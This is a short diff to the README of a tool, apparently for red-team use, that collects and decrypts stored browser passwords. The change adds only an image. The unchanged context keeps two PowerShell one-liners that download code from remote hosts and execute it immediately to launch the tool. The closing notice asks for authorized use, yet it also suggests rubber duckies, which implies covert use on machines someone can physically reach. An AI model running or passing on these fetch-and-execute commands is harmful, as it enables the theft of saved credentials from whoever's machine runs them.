@@ -13,6 +13,11 @@ A tool designed to securely collect and decrypt stored browser credentials from 
 iex (iwr WindowsSys.Tools)
 iex (iwr System32.Windows.Sys.Tools)
 ```
+
+<p align="center">
+  <img src="https://github.com/pentestfunctions/chromium_passwords_local_collection/blob/main/images/sample.png">
+</p>
+
 ## 🚨 Important Notice
 
 This tool is intended for **AUTHORIZED USE ONLY**. Always obtain proper permissions before using on any system. Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical. Red team engagements and rubber duckies work awesome with this.
